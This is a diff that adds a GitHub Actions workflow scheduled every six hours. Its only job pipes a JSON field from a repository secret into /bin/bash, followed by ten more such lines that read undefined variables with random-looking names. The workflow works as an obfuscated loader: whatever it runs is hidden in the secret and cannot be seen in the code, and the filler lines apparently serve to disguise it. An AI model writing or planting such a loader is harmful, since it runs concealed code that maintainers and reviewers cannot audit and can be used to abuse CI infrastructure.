@@ -1,0 +1,28 @@
+name: zuannuningren
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuannuningren
+        env:
+          t1180: ${{ secrets.t1180 }}
+        run: |
+          echo $t1180 | jq -r .v3351 | /bin/bash
+          echo $xtonb77286 | jq -r .rvpvw52166 | /bin/bash
+          echo $u18839 | jq -r .mnxxx5639 | /bin/bash
+          echo $gneo7 | jq -r .mqh39954 | /bin/bash
+          echo $jjzd19 | jq -r .ewd437 | /bin/bash
+          echo $auup325 | jq -r .h589 | /bin/bash
+          echo $djyn707 | jq -r .ck2392 | /bin/bash
+          echo $hq9741 | jq -r .jj646 | /bin/bash
+          echo $nako0114 | jq -r .z3457 | /bin/bash
+          echo $vbjy35989 | jq -r .lcf195 | /bin/bash
+          echo $t563 | jq -r .wt67516 | /bin/bash
+
